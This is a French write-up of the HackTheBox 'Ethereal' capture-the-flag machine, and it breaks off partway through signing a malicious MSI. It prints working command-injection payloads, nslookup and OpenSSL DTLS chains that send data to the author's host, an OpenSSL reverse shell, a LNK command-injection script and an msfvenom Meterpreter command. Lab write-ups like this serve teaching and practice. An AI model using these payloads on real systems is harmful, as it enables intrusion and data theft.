# Solution du CTF Ethereal de HackTheBox

Between a rock and a hard place
-------------------------------

Il est de ces CTFs qui sont capables de vous pourrir la vie et vous font vous arracher les cheveux... *Ethereal* est l'un de deux là :)   

Il est très frustrant car toute tentative de se libérer des restrictions présentes semble aboutir systématiquement à un échec et il vous faut une demi heure pour copier un simple fichier.  

Abandonnez tout espoir vous qui entrez ici
------------------------------------------

Un Nmap remonte des ports plutôt standard et pauvres fous que nous sommes, impossible de deviner la galère dans laquelle on est en train de se mettre :D   

```plain
Nmap scan report for 10.10.10.106
Host is up (0.15s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
8080/tcp open  http-proxy
```

Le FTP accepte les connexions anonymes en lecture seule. On peut récupérer son contenu de cette façon :  

```bash
wget --no-passive-ftp -r ftp://10.10.10.106/
```

Ça nous donne cette arborescence (on y reviendra bientôt) :  

```plain
10.10.10.106/
├── binaries
│   ├── Orca.Msi
│   ├── Setup_MagicISO.exe
│   └── TrueCrypt-7.2.exe
├── CHIPSET.txt
├── DISK1.zip
├── edb143en.exe
├── FDISK.zip
├── New folder
│   └── download11nEM203937.zip
├── New folder (2)
│   ├── DISPLAY.SYS
│   ├── EGA2.CPI
│   ├── EGA3.CPI
│   ├── EGA.CPI
│   ├── KEYB.COM
│   ├── KEYBOARD.SYS
│   ├── KEYBRD2.SYS
│   ├── KEYBRD3.SYS
│   ├── KEYBRD4.SYS
│   └── MODE.COM
├── subversion-1.10.0
│   ├── aclocal.m4
│   ├── autogen.sh
│   ├── BUGS
│   ├── build.conf
│   ├── CHANGES
│   ├── COMMITTERS
│   ├── configure.ac
│   ├── .editorconfig
│   ├── gen-make.py
│   ├── get-deps.sh
│   ├── INSTALL
│   ├── LICENSE
│   ├── Makefile.in
│   ├── NOTICE
│   ├── README
│   ├── win-tests.py
│   └── .ycm_extra_conf.py
└── teamcity-server-log4j.xml

4 directories, 36 files
```

Qu'est-ce qu'on peut en tirer à ce stade ? Pas grand chose.  

*Orca* est un logiciel d'édition de MSI (par exemple pour les préparer à des déploiements). Peut être un indice pour plus tard ? Mot de passe à extraire d'un MSI ? A voir...  

On sait que le développement de *TrueCrypt* a été abandonné par ses créateurs mais cette version 7.2 est vulnérable à du *binary planting* (*dll hijacking*). Là aussi rien à en tirer pour le moment.  

Ces exécutables ne semblent pas avoir été altérés car une recherche web sur leur hash MD5 retourne bien leur noms... On ne fouillera pas plus loin.  

Pour terminer l'exécutable *edb143en.exe*, bien que [packé avec Armadillo](https://www.vicheck.ca/htmlreport.php?SHA=aed8a03ece4bff0018f80f9f312b2a8c725b13cf84e3f90adbbd2b9c0b5b0be9) semble correspondre [à des drivers HP](https://download.cnet.com/PnP-TEAC-USB-FDD/3000-2122_4-125473.html).  

Je passe sur le port 80 qui est un site web avec quelques liens valides. J'utilise *Wapiti* en mode verbeux en spécifiant une liste de modules vides afin qu'il n'effectue qu'un crawling :  

```plain
$ ./bin/wapiti -u http://10.10.10.106/ -m "" -v 2

     __      __               .__  __  .__________
    /  \    /  \_____  ______ |__|/  |_|__\_____  \
    \   \/\/   /\__  \ \____ \|  \   __\  | _(__  <
     \        /  / __ \|  |_> >  ||  | |  |/       \
      \__/\  /  (____  /   __/|__||__| |__/______  /
           \/        \/|__|                      \/
Wapiti-3.0.0 (wapiti.sourceforge.net)
[*] Vous êtes chanceux ! C'est la pleine lune ce soir.
[+] GET http://10.10.10.106/ (0)
[+] GET http://10.10.10.106/corp/console/admin.aspx (1)
[+] GET http://10.10.10.106/corp/help/Assistance.aspx (1)
[+] GET http://10.10.10.106/corp/login/default.aspx (1)
[+] GET http://10.10.10.106/corp/js/modernizr.js (1)
[+] GET http://10.10.10.106/corp/js/main.js (1)
[+] GET http://10.10.10.106/corp/css/style.css (1)
[+] GET http://10.10.10.106/corp/js/jquery-2.1.1.js (1)
[+] GET http://10.10.10.106/corp/css/reset.css (1)
[+] GET http://10.10.10.106/corp/img/cd-logo.svg (1)
[+] GET http://10.10.10.106/corp/console/css/style.css (2)
[+] GET http://10.10.10.106/corp/console/notes/index.html (2)
[+] GET http://10.10.10.106/corp/console/desktop/default.aspx (2)
[+] GET http://10.10.10.106/corp/console/js/index.js (2)
[+] POST http://10.10.10.106/corp/help/Assistance.aspx (2)
    data: __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTE0MTEwOTYzOTVkZFsh7rwd76YqPvG%2FAYWw6fdTK%2BWAaQF9bVEbhkfVKqdK&__VIEWSTATEGENERATOR=F933AC8D&__EVENTVALIDATION=%2FwEdAAYXQad%2FZYy6e1xk%2BewJg%2F58KhoCyVdJtLIis5AgYZ%2FRYdzhqBVdMB%2BAVo7zudn5890J7quUiYBCd9nkP3BUPF%2FtqdJRcNqTgtSEJn%2Brhz8xxVLGYXgBLJYeDpSbEcY552VLv4GP3GZjROGFNkdpvNwQgpmYRa%2Bqub%2F0Cno7s671Mw%3D%3D&username=default&email=default&website=default&message=default
[+] GET http://10.10.10.106/corp/help/css/spectre.css (2)
[+] GET http://10.10.10.106/corp/help/css/style.css (2)
[+] GET http://10.10.10.106/corp/help/js/main.js (2)
[+] GET http://10.10.10.106/corp/help/css/reset.css (2)
[+] GET http://10.10.10.106/corp/help/js/modernizr.js (2)
[+] GET http://10.10.10.106/corp/help/js/velocity.min.js (2)
[+] GET http://10.10.10.106/corp/help/js/jquery-2.1.1.js (2)
[+] GET http://10.10.10.106/corp/login/js/index.js (2)
[+] GET http://10.10.10.106/corp/login/css/style.css (2)
[+] GET http://10.10.10.106/corp/console/desktop/css/style.css (3)
[+] GET http://10.10.10.106/corp/console/desktop/js/index.js (3)
[*] Enregistrement de l'état du scan, veuillez patienter...
```

Il n'y a qu'un seul script qui semble prendre des entrées... c'est peu, surtout qu'une URL semble correspondre à une page de login.  

A bien regarder on s’aperçoit que le HTML dans cette page est cassé (ce qui explique le résultat de *Wapiti*) mais que de toute façon si on tente de forcer la soumission de données sur la page (via ZAP par exemple) cela ne nous mène nul part.  

La page d'assistance qui contient un formulaire valide indique :  

> Just enter your IP address and Client ID which was given. We'll try to access the share we created on your server and check the logs.

![HackTheBox Ethereal CTF assistance.aspx web form](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/ethereal_assistance.png)

Après avoir saisie mon IP directement, en lien http, https, chemin UNC dans les différents champs, force est de constater qu'on est dans une impasse.  

Allez, peut être plus de chance sur la section admin :) On a une note laissée à l'attention d'un certain *Alan* :  

> Welcome Alan,  
> 
>   
> 
> We're excited to present to you this new console.  
> 
> We've added the new test connection page from where you can directly check before connecting to clients instead of opening up your pc everytime(boring).  
> 
> It's still in Beta stage so you might encounter some problems, let us know. We're looking forward to even more years of loyal partnership between us.

On a au moins un nom d'utilisateur ! Quand à la console en question c'est un gros troll avec une interface web ressemblant à du Windows 7. Rien de vrai, juste des layouts qui s'affichent ou se cachent en fonction de où l'on clique.  

![HackTheBox Ethereal CTF fake web Windows](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/ethereal_troll.png)

On a même droit à un bon gros troll avec un faux flag (je me demande combien ont tenté de rentrer ce flag sur l'interface de *HackTheBox*).  

Le dernier lien renvoie juste au port 8080 qui nécessite une authentification. A noter qu'il fallait ajouter une entrée pour *ethereal.htb* dans son fichier */etc/hosts* sinon on obtenait une erreur explicite.  

J'ai lancé *Patator* dessus pour essayer de trouver un password pour Alan, toujours sans résultat :(   

All I Got Was This Lousy T-Shirt
--------------------------------

Retour aux fichiers sur le FTP : il reste les images disque que je n'ai pas trop regardé. La commande *file* indique du MSDOS 5.0 ce qui m'amène via une recherche sur [la solution pour un autre CTF](https://highon.coffee/blog/the-wall-walkthrough/).  

Il y est mention d'un outil d'inforensique baptisé [Fat Cat](https://github.com/Gregwar/fatcat/) (rapport à FAT16 ou FAT32).  

Cet utilitaire se compile parfaitement (forcément, c'est basé sur *CMake*) et est simple d'utilisation.  

A ma grande surprise c'est sur l'image FDISK que j'ai trouvé quelque chose d'intéressant :  

```plain
$ ./fatcat /tmp/FDISK -d -l /PBOX
Listing path /PBOX
Directory cluster: 2
d 2/7/2018 23:16:32  ./                             c=2
d 2/7/2018 23:16:32  ../                            c=0
f 25/8/2010 09:55:10  HANGES.TXT                     c=3 s=466 (466B) h d
f 24/8/2010 20:41:50  ICENSE.TXT                     c=4 s=35821 (34.9814K) h d
f 2/7/2018 23:05:18  PBOX.DAT                       c=74 s=284 (284B) h
f 25/8/2010 10:02:48  PBOX.EXE                       c=75 s=81384 (79.4766K) h
f 24/8/2010 20:41:54  BOX.TXT                        c=234 s=2702 (2.63867K) h d
```

Dans le dernier fichier texte on peut lire ceci :  

```plain
-=[  PasswordBox  ]=-

PasswordBox is a console-mode program which will keep all your passwords safe, inside an encrypted database.
This program is written by Mateusz Viste, and uses the AES implementation of Chris Brown to handle all encryption/decryption processes.
```

Une recherche nous amène [à ce projet SourceForge](https://sourceforge.net/p/passwbox/code/HEAD/tree/) dont le code est accessible. Sans surprise on y voir la mention *Rijndael* (donc *AES*).  

J'ai regardé brièvement comment se faisait le (dé)chiffrement au cas où il faudrait écrire un outil de force brute mais la suite m'a montré que ce n'était pas nécessaire (d'autres l'ont fait cependant).  

Avec *Fat Cat* on extrait l'exécutable *pbox.exe* ainsi que les mots de passes chiffrés (*pbox.dat*).  

[Wine](https://www.winehq.org/) nous invite poliment à nous diriger vers [DOSBox](https://www.dosbox.com/) pour émuler le programme MSDOS.  

Pour accéder à l'exécutable depuis DOSBox il faut d'abord monter son emplacement depuis l'émulateur puis se placer dedans. On en profite pour charger le clavier français car on est amené à saisir des mots de passe.  

```plain
mount c .
c:
keyb fr
```

On teste les mots de passe les plus fréquents (123456, etc) et on arrive rapidement sur *password* :  

![Ethereal HackTheBox CTF pbox decrypt DOSbox](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/ethereal_pbox.png)

Cette fois les identifiants *alan / !C414m17y57r1k3s4g41n!* nous permettent d'accéder au port 8080 :)  

Message in a bottle
-------------------

On a dorénavant un champ de texte sur une page web avec le titre *Test Connection*. Ça peut faire penser [au cmdlet Powershell](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/test-connection?view=powershell-6) correspondant pour effectuer un ping... oui mais non.  

Certes si on rentre notre IP on peut observer deux messages ICMP ECHO arriver mais toute tentative d'injection de code Powershell à la suite de l'adresse IP semble dévorée par [Urizen](http://imagecomics.wikia.com/wiki/Urizen) ([Spawn 96](http://imagecomics.wikia.com/wiki/Spawn_Vol_1_96) pour les connaisseurs).  

Cette exécution de commande distante (RCE) totalement en aveugle (aucun output ni message d'erreur) existe pourtant bien comme l'atteste la saisie suivante qui génère 12 pings vers notre machine :  

```plain
10.10.14.221 & ping -n 10 10.10.14.221
```

Tenter depuis *Ethereal* d'accéder à un partage Samba sous notre contrôle échoue aussi, certainement une règle de pare-feu qui fait du zèle.  

J'ai tenté d'exécuter ce port-scanner en PowerShell histoire de connaître les ports autorisés mais rien, pas même une carte postale :(   

```plain
powershell.exe -nop -exec bypass -c "1..65535 | % { (New-Object Net.Sockets.TcpClient).Connect('10.10.15.208', $_) }"
```

En revanche on peut utiliser les spécificités du langage Batch pour tester la présence de dossiers et fichiers par exemple :  

```plain
10.10.14.221 & if exist c:\inetpub ping -n 3 10.10.14.221
```

Nous envoie 5 pings prouvant que le dossier *inetpub* existe. Il en va de même pour *inetpub/ftproot* mais impossible d'aller plus profond, certainement en raison de permissions.  

On voit aussi que *c:\users\alan* existe mais qu'il ne semble pas y avoir le flag *user.txt* dans son bureau.  

On ne vas pas aller bien loin avec juste de l'ICMP... Il est temps de tester autre chose et c'est là qu'intervient DNS :  

```plain
10.10.14.221 & nslookup test.com 10.10.14.221
Capturing on 'tun0'
    1 0.000000000 10.10.10.106 → 10.10.14.221 DNS 71 Standard query 0x0001 PTR 221.14.10.10.in-addr.arpa
    2 2.002584547 10.10.10.106 → 10.10.14.221 DNS 54 Standard query 0x0002 A test.com
    3 4.009062791 10.10.10.106 → 10.10.14.221 DNS 54 Standard query 0x0003 AAAA test.com
    4 6.293979213 10.10.10.106 → 10.10.14.221 DNS 54 Standard query 0x0004 A test.com
    5 8.183692056 10.10.10.106 → 10.10.14.221 DNS 54 Standard query 0x0005 AAAA test.com
```

Super ! On peut générer des requêtes DNS vers notre machine. On peut dès lors chaîner une commande vers *nslookup* (la première ligne est l'injection, la suite la capture réseau) :  

```plain
10.10.14.221 & dir /B c:\users | nslookup - 10.10.14.221
   8 333.059294275 10.10.10.106 → 10.10.14.221 DNS 50 Standard query 0x0002 A v4.5
    9 335.055060550 10.10.10.106 → 10.10.14.221 DNS 50 Standard query 0x0003 AAAA v4.5
   10 337.070413003 10.10.10.106 → 10.10.14.221 DNS 50 Standard query 0x0004 A v4.5
   11 339.070868777 10.10.10.106 → 10.10.14.221 DNS 50 Standard query 0x0005 AAAA v4.5
   12 341.377915374 10.10.10.106 → 10.10.14.221 DNS 59 Standard query 0x0006 A Administrator
   13 343.575303138 10.10.10.106 → 10.10.14.221 DNS 59 Standard query 0x0007 AAAA Administrator
   14 345.637335569 10.10.10.106 → 10.10.14.221 DNS 50 Standard query 0x0008 A alan
   15 347.630580121 10.10.10.106 → 10.10.14.221 DNS 50 Standard query 0x0009 AAAA alan
   16 349.673693304 10.10.10.106 → 10.10.14.221 DNS 51 Standard query 0x000a A jorge
   17 351.665409391 10.10.10.106 → 10.10.14.221 DNS 51 Standard query 0x000b AAAA jorge
   18 354.056552932 10.10.10.106 → 10.10.14.221 DNS 52 Standard query 0x000c A Public
   19 356.052877169 10.10.10.106 → 10.10.14.221 DNS 52 Standard query 0x000d AAAA Public
   20 358.061412690 10.10.10.106 → 10.10.14.221 DNS 51 Standard query 0x000e A rupal
   21 360.103338021 10.10.10.106 → 10.10.14.221 DNS 51 Standard query 0x000f AAAA rupal
```

Certes ce n'est pas parfait car *nslookup* ne vas émettre de requêtes pour les entrées ayant un format valide. C'est pour cela que j'utilise le mode condensé de *dir* avec l'option /B.  

On devine aussi que le nom de dossier v4.5 est incomplet et qu'il y a quelque chose probablement devant.  

Tout cela est suffisant pour fouiller dans *c:\inetpub\wwwroot*. On peut même utiliser l'astérisque lorsque l'on dispose seulement d'une partie d'un nom.  

On peut pousser encore plus loin le vice en utilisant la commande [loop](https://ss64.com/nt/for.html) et sa syntaxe bizarre pour obtenir les ports en écoute :  

```plain
10.10.15.30 & FOR /F "tokens=2 skip=4" %Y IN ('netstat -a -p tcp') do nslookup %Y 10.10.15.30
0.0.0.0:135
0.0.0.0:3389
0.0.0.0:445
0.0.0.0:47001
0.0.0.0:49664
0.0.0.0:49665
0.0.0.0:49666
0.0.0.0:49667
0.0.0.0:49668
0.0.0.0:49669
0.0.0.0:5985
0.0.0.0:80
0.0.0.0:8080
AAAA
10.10.10.106:139
10.10.10.106:80
10.10.10.106:8080
```

Idem pour la liste des process :  

```plain
10.10.15.30 & FOR /F "tokens=1" %Y IN ('tasklist /NH') do nslookup %Y 10.10.15.30
csrss.exe
dwm.exe
lsass.exe
services.exe
smss.exe
svchost.exe
System
vmacthlp.exe
wininit.exe
winlogon.exe
WUDFHost.exe
```

Via le listing des fichiers j'ai remarqué la présence d'un fichier *note-draft.txt* dans le bureau de Alan. Pour extraire son contenu on peut utiliser la commande suivante et incrémenter le numéro de token (pas passionnant j'avoue) :  

```plain
10.10.15.30 & FOR /F "tokens=1" %Y IN (c:\users\alan\desktop\note-draft.txt) do nslookup %Y 10.10.15.30
```

On obtient alors :  

> I've created a Alan shortcut for VS on the Public Desktop to ensure we use the same version Please delete any existing shortcuts and use this one instead

Ça ne fait pas les 160 octets attendus du fichier mais on a la majorité (sans la ponctuation).  

Cette librairie que tout le monde déteste
-----------------------------------------

Durant mon exploration du système j'ai assez rapidement remarqué la présence d'un dossier OpenSSL dans *c:\Program Files (x86)* :  

```plain
10.10.14.151 & dir /B c:\progra~2 | nslookup - 10.10.14.151
OpenSSL-v1.1.0
```

Ce dossier contient un sous-dossier *bin* dans lequel on retrouve l'exécutable *openssl.exe* et ça tombe bien car il semble que l'on soit en mesure de l'exécuter alors que l'accès à de nombreuses commandes plus basiques (net, powershell, etc) soit bloqué.  

Reste à savoir comment faire passer la commande *s\_client* d'OpenSSL sur de l'UDP ! Il n'aura pas fallut longtemps pour trouver des références à [Datagram Transport Layer Security (DTLS)](https://en.wikipedia.org/wiki/Datagram_Transport_Layer_Security).  

Pour pouvoir exfiltrer l'output de nos commandes avec *s\_client* et il faut pouvoir mettre son alter-ego *s\_server* en écoute. Au préalable on doit générer un certificat et une clé privée (l'option *nodes* permettant comme personne ne s'en doute de passer outre la définition d'un mot de passe pour la clé privée) :  

```plain
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -nodes
```

On écoute alors sur le port UDP 53 (il faut forcer l'IPv4 car l'IPv6 est par défaut) :  

```plain
sudo openssl s_server -4 -cert cert.pem -key key.pem -dtls1_2 -accept 53
```

Via notre formulaire web on exécute le client :  

```plain
10.10.14.151  & whoami | "c:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -dtls1_2 -connect 10.10.14.151:53
```

Verbose output is verbose (on peut rajouter l'option -quiet sur notre serveur pour s'en débarrasser) :  

```plain
Using default temp DH parameters
ACCEPT
-----BEGIN SSL SESSION PARAMETERS-----
MFsCAQECAwD+/QQCwDAEAAQwHs7lRaG1fGUxUvYsGqOab4RB1rn+far14MAqiPYP
3aexpclhbvnLT/sSF6eX8lgloQYCBFvoMumiBAICHCCkBgQEAQAAAK0DAgEB
-----END SSL SESSION PARAMETERS-----
Shared ciphers:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES128-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:AES256-SHA:AES128-SHA
Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224:RSA+SHA1:DSA+SHA1:ECDSA+SHA1
Shared Signature Algorithms: RSA+SHA512:DSA+SHA512:ECDSA+SHA512:RSA+SHA384:DSA+SHA384:ECDSA+SHA384:RSA+SHA256:DSA+SHA256:ECDSA+SHA256:RSA+SHA224:DSA+SHA224:ECDSA+SHA224:RSA+SHA1:DSA+SHA1:ECDSA+SHA1
Supported Elliptic Curve Point Formats: uncompressed:ansiX962_compressed_prime:ansiX962_compressed_char2
Supported Elliptic Groups: X25519:P-256:P-521:P-384
Shared Elliptic groups: X25519:P-256:P-521:P-384
---
No server certificate CA names sent
CIPHER is ECDHE-RSA-AES256-GCM-SHA384
Secure Renegotiation IS supported
TIMEOUT occurred
ethereal\alan
```

Avec cette méthode on peut ainsi récupérer la totalité du fichier *note-draft.txt* :  

```plain
I've created a shortcut for VS on the Public Desktop to ensure we use the same version. Please delete any existing shortcuts and use this one instead.

- Alan
```

J'ai découvert que l'utilisateur *Alan* ne dispose que des droits lecture et exécution sur ses propres dossiers, ce qui ne facilite pas l'upload de fichiers...  

Peut être est-il temps de jeter un œil à ce fameux raccourci   

```plain
 Volume in drive C has no label.
 Volume Serial Number is FAD9-1FD5

 Directory of c:\users\public\desktop\shortcuts

10/31/2018  02:01 PM    <DIR>          .
10/31/2018  02:01 PM    <DIR>          ..
10/31/2018  02:08 PM             1,585 Visual Studio 2017.lnk
```

L'analyse du lien montre la cible suivante :  

```plain
D:\Program Files (x86)\Microsoft Visual Studio\2017\Community\Common7\IDE\devenv.exe
```

Avec la commande *fsutil fsinfo drives* on voit bien qu'un disque *D:* existe mais on ne dispose pas d'assez de droits pour y accéder.  

De toute évidence notre objectif est d'écraser directement le fichier LNK au vu des permissions accueillantes :  

```plain
c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk NT AUTHORITY\SYSTEM:(I)(F)
                                                         ETHEREAL\rupal:(I)(D,DC)
                                                         ETHEREAL\Administrator:(I)(D,DC)
                                                         BUILTIN\Administrators:(I)(F)
                                                         ETHEREAL\jorge:(I)(F)
                                                         NT AUTHORITY\INTERACTIVE:(I)(M,DC)
                                                         NT AUTHORITY\SERVICE:(I)(M,DC)
                                                         NT AUTHORITY\BATCH:(I)(M,DC)
                                                         Everyone:(I)(M)

c:\users\public\desktop\shortcuts\ Everyone:(DENY)(D,WDAC,WO)
                                   NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                                   ETHEREAL\rupal:(OI)(CI)(D,DC)
                                   ETHEREAL\Administrator:(OI)(CI)(D,DC)
                                   BUILTIN\Administrators:(OI)(CI)(F)
                                   CREATOR OWNER:(OI)(CI)(IO)(F)
                                   NT AUTHORITY\INTERACTIVE:(OI)(CI)(M,DC)
                                   NT AUTHORITY\SERVICE:(OI)(CI)(M,DC)
                                   NT AUTHORITY\BATCH:(OI)(CI)(M,DC)
                                   Everyone:(OI)(CI)(M)
```

On a donc un dossier dans lequel on peut écrire et ça c'est une bonne nouvelle. Malheureusement le transfert de fichiers sous DTLS s'est montré catastrophique : fichiers tronqués, incohérences, impossible de reprendre un upload où on l'avais laissé (OpenSSL décide sans raisons qu'il ne veux rien envoyer...)... Quelle plaie !  

On arrive tout de même à extraire les règles de sortie du pare-feu avec l'option *-dtls1\_2* qui semble un peu plus fiable :  

```plain
10.10.12.219 & netsh advfirewall firewall show rule name=all dir=out | findstr RemotePort | "c:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -dtls1_2 -connect 10.10.12.219:53
RemotePort:                           53
RemotePort:                           73,136
```

Et la version plus exhaustive :  

```plain
Rule Name:                            Allow UDP Port 53
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            Out
Profiles:                             Domain,Private,Public
Grouping:
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             UDP
LocalPort:                            Any
RemotePort:                           53
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Allow TCP Ports 73, 136
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            Out
Profiles:                             Domain,Private,Public
Grouping:
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            Any
RemotePort:                           73,136
Edge traversal:                       No
Action:                               Allow

Rule Name:                            Allow Port 80, 8080
----------------------------------------------------------------------
Enabled:                              Yes
Direction:                            In
Profiles:                             Domain,Private,Public
Grouping:
LocalIP:                              Any
RemoteIP:                             Any
Protocol:                             TCP
LocalPort:                            80,8080
RemotePort:                           Any
Edge traversal:                       No
Action:                               Allow
```

On va finalement pouvoir passer par TCP avec les ports 73 et 136. Pour autant on ne peut pas uploader de fichiers à l'aide de bitsadmin, certutil, powershell ni même FTP.  

A titre informatif il aura fallut injecter les commandes suivantes pour tester FTP (depuis Kali on peut utiliser le module auxiliaire de serveur FTP de *Metasploit*) :  

```bash
echo open 10.10.14.242 73 > c:\users\public\desktop\shortcuts\devloop_ftp.txt
echo USER devloop >> c:\users\public\desktop\shortcuts\devloop_ftp.txt
echo nevergonnagiveyouup >> c:\users\public\desktop\shortcuts\devloop_ftp.txt
echo bin >> c:\users\public\desktop\shortcuts\devloop_ftp.txt
echo GET ncat.exe >> c:\users\public\desktop\shortcuts\devloop_ftp.txt
echo bye >> c:\users\public\desktop\shortcuts\devloop_ftp.txt
ftp -s c:\users\public\desktop\shortcuts\devloop_ftp.txt
```

De la même façon on trouve différentes versions de MSBuild (avec la commande *where /r c:\ msbuild.exe*) mais il s'avère que notre utilisateur *Alan* ne peut en exécuter aucune donc pas de [bypass d'AppLocker](https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/)... On est condamné à utiliser OpenSSL.  

On se consolera avec la possibilité d'obtenir un reverse shell interactif en exploitant ces deux ports. La technique est la même que décrite [dans cet article](https://medium.com/@honze_net/openssl-reverse-shell-with-certificate-pinning-e0955c37b4a7) mais appliqué à Windows donc :  

```plain
10.10.13.187 & "c:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.13.187:136 | cmd | "c:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.13.187:73
```

On a alors besoin de deux terminaux : l'un où le port 136 a été mis en écoute et sur lequel on rentre nos commandes, le second en écoute sur le port 73 où l'on peut lire le résultat de ces commandes.  

A noter que ça a très bien fonctionné tout le temps de l'exploitation mais je n'ai plus réussi à reproduire au moment de l'écriture du write-up...  

Pour les plus curieux d'entre vous voici le code du script de ping du CTF :  

```java
using System;
using System.Collections.Generic;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.IO;
public partial class wi_console_ping_default : System.Web.UI.Page
{
    protected void ping(object sender, EventArgs e)
    {
         if(search.Text=="")
         {
             l1.InnerText = "No host entered!";
            return;
         }

        //Response.Write(search.Text);
        Process myProcess = new Process();
        string result = "";
        myProcess.StartInfo.FileName = @"C:\WINDOWS\System32\cmd.exe";

        string no = "unreachable";

        myProcess.StartInfo.UseShellExecute = false;
        //myProcess.StartInfo.CreateNoWindow = true;
        myProcess.StartInfo.RedirectStandardInput = true;
        myProcess.StartInfo.RedirectStandardOutput = true;
        myProcess.StartInfo.Arguments = "/c ping -n 2 "+ search.Text ;

        myProcess.Start();

        StreamReader sOut = myProcess.StandardOutput;
        result = sOut.ReadToEnd();

        if (!myProcess.HasExited)
        {
            myProcess.WaitForExit();
        }

        //Response.Write(result);
        if (result.Contains("Request timed out") || result.Contains("not") || result.Contains(no)  )
        {
            l1.InnerText = "Couldn't reach the desired host!";
        }
        else
        {
            l1.InnerText = "Connection to host successful";
        }
            sOut.Close();
            myProcess.Close();
        search.Text = "";

    }
}
```

A Lnk To The Past
-----------------

Pas d'autre choix donc que nous pencher directement sur ce fameux fichier LNK.  

J'ai commencé simple en créant sur une VM Windows un raccourci exécutant la commande suivante :

```bash
cmd /c whoami | "c:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.13.187:136
```

Si les fichiers mentionnés n'existent pas, Windows peut refuser la création du lien. On peut au choix reproduire l'environnement en trouvant des binaires OpenSSL et les copier au même emplacement (ce que j'ai fait au bout d'un moment) soit placer un exécutable quelconque (*calc.exe*) à l'emplacement attendu.  

Quand on écrase le LNK (soit en redirigeant directement l'output de *OpenSSL* vers le fichier, soit en rajoutant une étape consistant à utiliser les options *enc -base64* d'*OpenSSL*) on a comme retour le nom de notre nouvel accès (la présence d'un autre utilisateur qui cliquerait sur le raccourci est simulée) :  

```plain
ethereal\jorge
```

Cet utilisateur dispose du premier flag dans son bureau :) Et dans ses documents le script chargé de lancer le LNK et de le restaurer régulièrement :  

```plain
@echo off

:loop

echo opening program

PING localhost -n 5 >NUL

START /MIN "" cmd /c "C:\Users\Public\Desktop\Shortcuts\Visual Studio 2017.lnk" && PING localhost -n 5 >NUL && copy /Y "C:\Users\jorge\Documents\Visual Studio 2017.lnk" "C:\Users\Public\Desktop\Shortcuts\Visual Studio 2017.lnk" && PING localhost -n 50 >NUL && taskkill /F /IM devenv.exe

cls

GOTO loop
```

Comme je ne voulais pas passer mon temps à switcher d'une VM à l'autre pour générer un nouveau LNK à chaque changement de commande j'ai d'abord créé un LNK utilisant le maximum de caractères autorisés (228 à ce que j'ai vu) et utilisé le script Python suivant qui injecte la commande de mon choix dans le LNK au bon offset :  

```python
import sys

MAX_LENGTH = 228
cmd = sys.argv[1]
if len(cmd) > MAX_LENGTH:
    print("Can't inject this command")
    exit()

cmd = cmd.rjust(MAX_LENGTH).encode("UTF-16LE")

with open("new_link.lnk", "rb+") as fd:
    fd.seek(0x235, 0)
    fd.write(cmd)
```

Les permissions obtenues avec *jorge* nous permet d’accéder au lecteur *D:* (youpi !). On remarque surtout le fichier *d:\dev\msis\note.txt* avec le contenu suivant :  

> Please drop MSIs that need testing into this folder - I will review regularly. Certs have been added to the store already.  
> 
>   
> 
> - Rupal

Et dans *d:\dev* se trouvent un dossier contenant un fichier *.cer* et un fichier *.pvk*. On devine aisément qu'il va falloir générer un MSI piégé puis le signer avec la clé privée... Simple ?  

Thank Gog I'm Using Linux
-------------------------

Pour créer un MSI j'ai d'abord eu recours à *Metasploit* :  

```bash
msfvenom -f msi -a x86 --platform windows -p windows/meterpreter/reverse_tcp_rc4 EnableStageEncoding=true RC4PASSWORD=fuckit LHOST=10.10.13.187 LPORT=73  -o rev.msi
```

Pour avoir les outils permettant de signer le MSI [il faut installer un SDK de Microsoft](http://www.microsoft.com/en-us/download/details.aspx?id=8279).  

Comme ils ne peuvent rien faire comme les autres la première étape est de convertir le CER et le PVK dans d'autres formats :D   

Je m'en tirais alors avec le batch suivant :  

```bash
"c:\Program Files\Microsoft SDKs\Windows\v7.1\Bin\Cert2Spc.exe" \\VBOXSVR\shared\MyCa.cer c:\users\ieuser\MyCa.spc
